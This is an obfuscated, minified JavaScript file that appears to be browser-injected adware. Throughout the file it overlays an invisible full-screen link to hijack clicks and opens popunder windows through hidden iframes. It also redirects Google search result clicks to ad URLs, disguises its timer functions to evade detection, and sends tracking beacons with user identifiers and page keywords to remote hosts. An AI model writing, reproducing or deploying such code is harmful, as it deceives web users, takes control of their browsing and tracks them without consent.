_GPL.j(function(e,d,hb,F,m,v,J,r,oa,Ia,G,Kb,Lb,Mb,pa,O,f,ib,qa,jb,A,x,lc,y,Nb,Ja){function Ka(a,b,c){c=c||f;var d=!0;a&&e.each(a,function(g,Ob){return d=!!b.call(c,Ob,g,a)});return d}function Pb(a){var b=[];Ka(a,function(a){0>e.inArray(a,b,void 0)&&b.push(a);return!0});return b}function La(){}function Qb(a,b){return e(a).parents().is(b)}function Rb(a){return e(a).map(function(a,c){(a=c.parentNode)&&a.removeChild(c);return c}).toArray()}function Ma(a,b){function c(b){for(var c=a.split(".");b&&c.length;)b=
b[c.shift()];return b}if(a)return Qb(ra,k.body)||(ra=Rb('<iframe style="display:none;visibility:hidden"></iframe>')[0],k.body.appendChild(ra)),c(ra.contentWindow)||b||c(f)}function Na(a){var b=(a=a||f.event)&&a.type;if(b&&(a.cancelBubble=!0,Ma("Event.prototype.stopImmediatePropagation",La).call(a),Ma("Event.prototype.stopPropagation",La).call(a),"beforeunload"!==b))return a.returnValue=!1,Ma("Event.prototype.preventDefault",La).call(a),!b}function X(a){a=Ia.userAgent.match(Kb(a+"[/ ](\\d+)","i"));
return(a&&a[1])|0}function Sb(a,b,c,d){var g=[];Ka(a,function(c,e){var f=b.call(this,c,e,a);(f!==O||d)&&g.push(f);return!0},c||f);return g}function Tb(a){a&&"object"===typeof a&&(a=e.extend.apply(e,arguments));return a}function u(a){var b={_:1E8*Math.random()|0},c="cdnstats-a.akamaihd.net/s.gif?";Ka(arguments,function(a){"string"===typeof a?c=a:Tb(b,"function"===typeof a?a(b):a);return!0});(new Image).src=r.protocol+"//"+c+Sb(b,function(a,b){if(null!==a&&a!==O)return v(pa(b))+"="+v(pa(a))}).join("&")}
function Ub(a,b){b=b||[];for(var c=0,d=Math.random(),g,e=0;e<b.length;e++)if(c+=b[e][1],d<c&&!g&&(g=b[e][0]),b[e][0]===a){g=a;break}return g||b[0][0]}function C(){return new m/1E3|0}function Oa(a,b,c){function d(a,b,c){try{return Object.defineProperty(a,b,c),!0}catch(mc){return!1}}function g(a,b,c){try{if(Object.prototype.__defineGetter__)return"value"in c?a.__defineGetter__(b,function(){return c.value}):("get"in c&&a.__defineGetter__(b,c.get),"set"in c&&a.__defineSetter__(b,c.set)),!0;if("value"in
c)return a[b]=c.value,!0}catch(d){}return!1}if(!sa)try{d({},"x",{}),sa=d}catch(e){sa=g}return sa(a,b,c)}function Vb(){if("1797"===p&&"GB"===l||f.name.match(/^_odctxdsp/)||"facebook.com"===P)return!1;if(kb)return u({t:"idlecrawler",d:d.gd(),xr:+n,cid:l,pid:p,guid:d.guid}),!1;n?(Q=fa=0,R=180,A+="_xr",x+="_xr",y+="_xr"):(fa=60,Q=7,R=60);ga();return!0}function ga(){ha(k,qa,ga);Pa&&!h?Y(!0):Wb(function(a,b,c){ta=a;Qa=b;Z||(Z=!0,Ra=!1,Xb(),Yb(),Sa(),e('<link rel="dns-prefetch" href="//'+Ta+'">').appendTo(k.getElementsByTagName("head")[0]||
S),c&&e('<link rel="dns-prefetch" href="//'+c+'">').appendTo(k.getElementsByTagName("head")[0]||S),ua=+new m,va=e(f).scrollLeft(),wa=e(f).scrollTop(),t(k,qa,lb),t(f,"scroll",mb),t(f,"unload",nb),ob=Zb(function(){36E5<+new m-ua&&(u({t:"p_inactive",d:d.gd(),xr:+n,cid:l,pid:p,guid:d.guid,bf:h|0}),Y(!1))},5E3))})}function Xb(){function a(a){var c=pb();B.attr({href:c,target:Ua()}).prop("src",c+"&"+d.B64.decode("ZGlzY2xvc2U="));return Na(a)}B||(B=e('<a style="z-index:999999999999999;padding:0;margin:0;cursor:default;opacity:0.01;position:fixed;top:0;left:0;background:transparent;width:100%;height:100%;">&nbsp;</a>'),
t(B[0],"mousedown",a),t(B[0],"mouseup",Na),t(B[0],"click",q),a());xa()}function lb(a){ia=[a.pageX,a.pageY,va,wa];ua=+new m;xa()}function mb(){va=e(f).scrollLeft();wa=e(f).scrollTop();ua=+new m;xa()}function Y(a){Z&&(Z=!1,hb(ob),F(Va),B.remove(),$b(),ha(k,qa,lb),ha(k,"scroll",mb),ha(f,"unload",nb),Qa=ta=O,T=U="",a||t(k,qa,ga))}function t(a,b,c){if(f[ib]){var d=ya();try{return d.call(a,b,c,!0)}catch(g){a[ib](b,c,!0)}}else a.attachEvent("on"+b,c)}function Yb(){ja=!0;d.ah(H,q);V||d.ah("keydown",q);d.ah("focus",
q);V&&d.ah("blur",q);try{var a=k.createElement("iframe");a.style.width="0px";a.style.height="0px";a.style.border="none";k.body.appendChild(a);a.contentWindow.focus();f.focus();k.body.removeChild(a)}catch(b){}za&&d.ah("keyup",q);e("*").add(f).each(function(a,c){Aa(c)||t(c,H,q)});qb||(qb=!0,e("*").add(f).each(function(a,c){Aa(c)||(t(c,"mousedown",W),t(c,"mouseup",W),t(c,"click",W))}),d.ah&&(d.ah("mousedown",W),d.ah("mouseup",W),d.ah("click",W)));e("iframe").each(function(a,c){try{Aa(c)||t(c.contentWindow,
H,q)}catch(d){}})}function ac(){if(X("Chrome")){for(var a=0;a<Ia.plugins.length;a++)if("Widevine Content Decryption Module"===Ia.plugins[a].name)return!1;return!0}return!1}function xa(){if(Z){B.is(S.lastChild)||B.appendTo(k.body);B.css({"z-index":999999999999999,padding:0,margin:0,cursor:"default",opacity:.01,position:"fixed",top:0,left:0,background:"transparent",width:"100%",height:"100%"});50<new m-rb&&(rb=+new m,sb=e("*").filter(function(a,c){return c[tb]}));var a=!1;e.each(sb,function(b,c){return!(a=
ub(c))});B.css("display",a?"none":"block");F(Va);Va=K(xa,50)}}function ub(a){a=e(a);var b=ia[0]+(va-ia[2]),c=ia[1]+(wa-ia[3]),d=a.offset(),g=d.left,d=d.top;return b>=g&&b<=g+a.width()&&c>=d&&c<=d+a.height()}function bc(a,b,c){function d(a,b){F(Wa);Wa=K(function(){g&&!g.closed&&(f.onbeforeunload=function(){},f.name=b,e("iframe").not('[src="https://cdncache-a.akamaihd.net/store/"]').remove(),r.href=a)},300)}if(!L&&!Xa){aa.parentNode&&ka||(ka=Ya());if(b!==r.href&&c&&(d(b,a),b=r.href,a="_blank",L=!0,
"2016110809_t"===E&&!n&&-1==M.indexOf("thrive_block")))try{J.setItem("wb93b",""+C())}catch(h){}var g;Xa=!0;if(X("Edge"))g=ka(b,a);else if(g=ka("","1749"===p?a:"_blank"))"_blank"!==a&&(g.name=a),g.location.href=b;Xa=!1;if(c&&(!g||g.closed)&&(L=!1,F(Wa),V&&(ka=Ya()),"2016110809_t"===E))try{J.removeItem("wb93b")}catch(h){}return g}}function Ua(){var a="ld893_";U&&(a+="_"+v(U),T&&(a+=","+T),a+="_");return a+="_"+C()}function pb(){if(ta){var a=ta;h&&!la&&(a+="&bf=1&fo=1");var b;e("a[href]").not(B).each(function(a,
d){ub(d)&&d.protocol.match(/^http/i)&&-1===d.href.indexOf(vb)&&-1===d.href.indexOf(Ta)&&(b=d.protocol+"//"+d.host+d.pathname+d.search+d.hash)});b&&(a+="&t="+v(b.substring(0,oa(0,1500-a.length))));a+="&rt="+(+new m-wb);Ba&&(a+="&data_tag="+v(Ba));return a+=xb?"&data_sid="+v(xb):""}}function cc(){var a=[];e("title").length&&(a=a.concat(e("title").text().toLowerCase().replace(/[.,!?]/g," ").split(" ")));e('meta[property="og:title"],meta[property="og:description"],meta[name="description"],meta[name="keywords"]').each(function(){var b=
e.trim(e(this).attr("content"));b&&b.match(/^\s*[a-zA-Z0-9]/)&&(a=a.concat(b.toLowerCase().replace(/[.,!?]/g," ").split(" ")))});a=e.trim(Pb(a).join(",").replace(/([,]+)/g,",").replace(/\s+/g," ")).split(",");return e.unique(a).join(",")}function Ca(a,b,c){a=(a||r.href).substr(0,1500);var e=c!==O?c:cc();a=a.replace(/:/g,"%3A");e=e.replace(/:/g,"%3A").substring(0,oa(0,1500-a.length));c=d.getSubId?"&subid="+d.getSubId(ma):"";a=v(d.B64.encode(a+"::z-"+p+"-"+Za+"::"+e));b="&cb="+(b||yb);b+="&data_fr="+
(zb(N)?"false":"true");b+="&data_proto="+v(r.protocol);b+="&ed=1";h&&(b+="&bf=1&fo=1&data_bf=1&data_fo=1");return d.proto+vb+"/pops?c="+a+"&a=1&ch="+v(Da)+c+b}function ha(a,b,c){if(f[jb])a[jb](b,c,!0);else a.detachEvent("on"+b,c)}function $b(){ja=!1;d.rh(H,q);V||d.rh("keydown",q);d.rh("focus",q);V&&d.rh("blur",q);za&&d.rh("keyup",q);e("*").add(f).off(H,q);e("iframe").each(function(a,b){try{e(b.contentWindow).off(H,q)}catch(c){}});hb(dc)}function ec(a){a=a||f.event||{};if(L)return!0;for(a=a.target||
a.srcElement;a;){var b=Aa(a);if(b)return Ra||(u({t:"p_bo",d:d.gd(),xr:+n,cid:l,pid:p,guid:d.guid,reason:b,bf:h|0}),Ra=!0),!0;a=a.parentNode}return!1}function I(a,b){a=G(a,10);isNaN(a)&&(a=G(J&&J.getItem(b)||d.gc(b,10),10)||0);return a}function zb(a){return(new m(1E3*(a||0))).toDateString()===(new m).toDateString()}function Ea(){N|=0;w|=0;ba|=0;var a=C(),b=w&&!zb(N);b&&(w=0,z.set(y,w));var c=!Q||a-N>=fa&&w<Q,a=a-ba>=R;return!n&&b||c&&a}function q(a){a=a||f.event||{};if(!ec(a)){var b=-1<["mousedown",
"mouseup","click"].indexOf(a.type);if(!(-1<["keydown","keyup"].indexOf(a.type)&&a.metaKey)){var c,e=ja&&Ab(),g=pb();e&&(d.log("Popping to: "+g),c=bc(Ua(),g,b));if(c&&!c.closed)return L=!0,e={url:g,cid:U,crid:T},Y(!0),Bb(),u({t:"p_success",d:d.gd(),xr:+n,cid:l,pid:p,guid:d.guid,bf:h|0}),Fa&&F(Fa),Ga&&F(Ga),fc(c,e),b||na(),W(a);c&&c.closed?Ga||(Ga=K(function(){u({t:"popclose",u:g,location:r.hostname,pid:p,guid:d.guid,tag:Ba||"",bf:h|0})},1E3)):e?Fa||(Fa=K(function(){u({t:"popfail",e:a.type,u:g,location:r.hostname,
pid:p,guid:d.guid,tag:Ba||""})},1E3)):na()}}}function fc(a,b){function c(){ha(f,"focus",c);var a=+new m-g;u({delay:a,t:"pop_f",cid:b.cid,crid:b.crid,u:b.url,location:r.hostname,zoneid:Za,pid:p,guid:d.guid,bf:h|0})}function e(){if(!a||a.closed||!1!==a.closed){var c=+new m-g;u({delay:c,t:"pop_c",cid:b.cid,crid:b.crid,u:b.url,location:r.hostname,zoneid:Za,pid:p,guid:d.guid,bf:h|0})}else K(e,50)}var g=+new m;e();t(f,"focus",c)}function Ab(){if(z.swf){N=I(z.get(A),A);316808>$a.score&&(w=I(z.get(y),y));
var a=ab(z.get(x));ba=I(a[P],x)}return Ea()}function Sa(){!z.swf&&Z&&z.get([A,y,x],function(a){a=a.v;N=I(a[A],A);316808>$a.score&&(w=I(a[y],y));a=ab(a[x]);ba=I(a[P],x);K(Sa,1E3)})}function Cb(a,b,c){z.set(a,c);c=C();J&&J.setItem(a,c);b=G(b,10);var d=new m;d.setSeconds(d.getSeconds()+b);k.cookie=a+"="+c+";expires="+d.toUTCString()+";path=/;domain="+P}function Bb(a){var b=C();Cb(A,fa,b);z.set(Nb,b);N=b;z.set(y,++w);a=a||P;R&&Cb(x,R,Ha+(Ha&&",")+a+":"+b)}function ab(a){var b={},c=C(),d=[];a=pa(a||"").split(",");
if(a.length){for(var e=0;e<a.length;++e){var f=a[e].split(":"),h=G(f[1],10);c-h<R&&(b[f[0]]=h,d.push(f[0]+":"+h))}Ha=d.join(",");z.set(x,Ha)}return b}function ca(a){return a||Ea()||n?h||a?"US"===l?44551:-1<["CA","GB","AU","FR","IT"].indexOf(l)?44178:43956:"US"===l?n?45300:46818:-1<["CA","GB","AU","FR","IT"].indexOf(l)?n?44402:45300:n?44104:44402:C()-(ba|0)<R?Infinity:w>=Q?"US"===l?149058:-1<["CA","GB","AU","FR","IT"].indexOf(l)?88620:59858:"US"===l?47432:-1<["CA","GB","AU","FR","IT"].indexOf(l)?46818:
45300}function gc(a){"US"===l?bb(a,47432,149058):-1<["CA","GB","AU","FR","IT"].indexOf(l)?bb(a,46818,88620):bb(a,45300,59858);return Ea()}function bb(a,b,c){a>=b&&(fa=0,a>=c&&w>=Q&&(w=oa(0,Q-1)))}function Wb(a){!function(){z.get(["frt","_GPL_oo_z7b85",A,x,y,Ja],function(b){if(b.v.frt){if("1750"===p){var c=b.v._GPL_oo_z7b85|0;if(86400>C()-c){da();return}}E||(E=b.v[Ja],E=Ub(E,[["2016110809_c",.98],["2016110809_t",.02]]),z.set(Ja,E));try{var e;"2016110809_t"===E&&(e=J.getItem("wb93b"))&&(J.removeItem("wb93b"),
!V&&!za&&120>C()-G(e,10)&&"http:"===r.protocol&&d.l("wb93b"))}catch(g){}Db||(Db=!0,d.pc(function(){Eb?Eb=!1:ja||(cb=!1,Y(),ga())}));f[yb]=function(b){hc(b,a)};c=C();N=I(b.v[A],A);w=I(b.v[y],y);b=ab(b.v[x]);ba=I(b[P],x);b=Ea();db&&w>=db||(b?(b=ca(),eb=+new m,d.insertJS(Ca()+"&ms="+b+"&r="+c),u({t:"p_req",ms:b,d:d.gd(),xr:+n,cid:l,pid:p,guid:d.guid,bf:h|0})):(b=ca(),d.log("minScoreNeeded: "+b),Infinity>b&&!cb&&!n?(eb=+new m,d.insertJS(Ca()+"&ms="+b+"&r="+c),u({t:"p_req",ms:b,d:d.gd(),xr:+n,cid:l,pid:p,
guid:d.guid,bf:h|0}),cb=!0):na(),h||F(Fb)))}else da()})}()}function ya(){if(!ya.v){var a=k.createElement("iframe");try{S.appendChild(a),ya.v=a.contentWindow.Element.prototype.addEventListener,S.removeChild(a)}catch(b){a&&S.removeChild(a)}}return ya.v||Element.prototype.addEventListener}function Ya(){aa=k.createElement("iframe");aa.style.display="none";aa.style.visibility="hidden";S.appendChild(aa);return aa.contentWindow.open}function W(a){L&&!fb&&(fb=K(function(){fb=O;L=!1},100));a=a||f.event||{};
return L||a.type&&a.type!==H&&ja?Na(a):!0}function Gb(a,b){var c="http://"+Ta+"/click",c=a.uh?c+("?h="+v(a.uh)):c+("?c="+v(a.cid)),c=c+(d.getSubId?"&subid="+d.getSubId(ma):""),c=c+(E?"&data_test="+v(E):""),c=c+("&data_fb="+(ac()?"yes":"no")),c=c+("&data_rtt="+b)+("&data_proto="+v(r.protocol)),c=c+("&data_ic="+(kb?"true":"false"));h&&!la&&(c+="&data_bf=1&bf=1&data_fo=1&fo=1");return c+="&data_ss="+(screen.availHeight|0)+"x"+(screen.availWidth|0)}function na(){Pa||h||db?da():(Pa=!0,ic?jc():(d.insertJS(d.proto+
d.baseCDN+"/items/z7b85/js/z7b85.js","z7b85bm"),Y(!0)))}function jc(){function a(a){return a.toLowerCase().replace(/[.,!?]/g," ").split(" ").join(",")}var b=d.rs(12);d.ah("mousedown",function(c){var k=c.target||c.srcElement;if(k&&e(k).is("h3 a:visible")){var g=k.getAttribute("data-href")||k.href;if(g&&!k[b]){k[b]=!0;k.setAttribute("target","_blank");var q=d.rs(12);f[q]=function(b){if(b){var c=G(b.score,10);if(c>=ca(!0)){U=b.cid;T=b.crid;b=Gb(b,0);h&&(b+="&t="+v(r.href));u({t:"p_bid",d:d.gd(),xr:+n,
cid:l,pid:p,guid:d.guid,score:c,bf:h|0});try{var t=d.gd(g.split("/")[2])}catch(w){}t=t||P;Bb(t);f.onbeforeunload=function(){};f.name=Ua();e("iframe").not('[src="https://cdncache-a.akamaihd.net/store/"]').remove();d.log("Popping to: "+b);r.href=b}else gb(),h||(h=!0,A+="_bm",x+="_bm",y+="_bm",Ab(),Sa(),d.insertJS(Ca(g,q,a(k.innerText))+"&ms="+ca(!0)+"&r="+ +new m))}};c=ca(!0);d.insertJS(Ca(g,q,a(k.innerText))+"&ms="+c+"&r="+ +new m);u({t:"p_req",ms:c,d:d.gd(),xr:+n,cid:l,pid:p,guid:d.guid,bf:h|0})}}})}
function da(){if(!d.item_vars.z7b85_ro&&(d.item_vars.z7b85_ro=!0,f._admgrRO))try{f._admgrRO()}catch(a){}}function gb(){u({t:"p_nobid",d:d.gd(),xr:+n,cid:l,pid:p,guid:d.guid,bf:h|0})}function nb(){u({t:"p_unload",d:d.gd(),xr:+n,cid:l,pid:p,guid:d.guid,score:Qa,bf:h|0})}function Hb(a){function b(a){var b=c("toString"),d=c("valueOf");d.toString=b.toString=b;b.valueOf=d.valueOf=d;return a?b:d}function c(a){var b=function(){return r.reload.toString().replace("reload",this.name)};Oa(b,"name",{value:a});
return b}Oa(a,"valueOf",{value:b(0)});Oa(a,"toString",{value:b(1)});return a}function K(a,b){return Mb(Hb(a),b)}function Zb(a,b){return Lb(Hb(a),b)}function Aa(a){if(a){if(a[tb])return"ot";if(e(a).hasClass("sgsefvhuedc"))return"fo"}}function hc(a,b){var c=+new m-eb;T=U="";h&&(la=!1);if(ea&&ea.score){if(!a||G(a.score,10)<G(ea.score,10))a=ea,la=!0;ea=O}a?(a.crid&&(T=a.crid),a.cid&&(U=a.cid),a.url||(a.url=Gb(a,c)),c=G(a.score,10),c>=ca()&&gc(c)?(wb=+new m,F(Fb),F(Ib),Ib=K(function(){u({t:"p_expired",
d:d.gd(),xr:+n,cid:l,pid:p,guid:d.guid,bf:h|0});Y(!0);ga()},6E5),$a={score:c,now:+new m},b(a.url,c,a.domain),u({t:"p_bid",d:d.gd(),xr:+n,cid:l,pid:p,guid:d.guid,score:c,bf:h|0})):(h||(d.item_vars.z7b85_b=a),gb(),h?da():na())):(gb(),h?da():na())}var ra,sa,z=d.items.e6a00,k=f.document,S=k.body,kc=X("chrome"),V=X("firefox"),za=X("safari"),Da=d.item_vars["22555_ch"]||d.item_vars.ch||"",fa,N,ba,M=d.dt(),M=M&&M.inherited&&M.inherited.t||[],n="x"===Da||-1<M.indexOf("adult")||!M.length&&0<e('meta[content="RTA-5042-1996-1400-1577-RTA"]').length;
n&&(-1===M.indexOf("adult_block")?Da="x":(Da="x-issue",n=!1));var R,ma="z7b85",vb=d.gsd&&d.gsd(ma)||"s.hklmm.com",Ta=d.gsd&&d.gsd(ma+"_ic")||"prjcq.com",Z=!1,ob,ua,ja=!1,P=d.gd(),Qa,ta,wb=0,eb=0,Ib,Ha="",w=0,Q,$a={},U="",T="",Fb,cb=!1,E,Fa,Ga,Ba,H="click";if(kc||za)H="mousedown";else if(V||k.all||X("trident"))H="mouseup";var Jb=d.zoneid(ma,!0).split("_"),Za=Jb[0],p=pa(Jb[1]||d.vars.pid),l=d.vars.cid,xb=d.vars.systemid,yb=d.rs(20),Wa,dc,kb=function(){try{return f[(f.btoa||function(a){return a})(r.hostname+
"::"+(new m).toDateString())]===r.protocol}catch(a){return!1}}(),fb,tb="91c4",Db=!1,Eb=!0,aa,ka=Ya(),L=!1,Xa=!1,qb=!1,h=0<e("#z7b85bm").length,Pa=!1,ea,db=oa(d.vars.z7b85_mp|0,0),sb=[],ia=[0,0,0,0],B,rb=0,Va,va=0,wa=0,Ra=!1,ic="google"===d.gd().split(".").shift(),la=!0;if(f===top){if(h){d.ri("z7b85bm");A+="_bm";x+="_bm";y+="_bm";if(ea=d.item_vars.z7b85_b)d.item_vars.z7b85_b=O;la=!1}Vb();da()}},_GPL,clearInterval,clearTimeout,Date,encodeURIComponent,window.localStorage,location,Math.max,navigator,
parseInt,RegExp,setInterval,setTimeout,String,void 0,window,"addEventListener","mousemove","removeEventListener","z7b85_pop_g","z7b85_pop_s","z7b85_s","z7b85_pop_gs","z7b85_spopd","z7b85_test");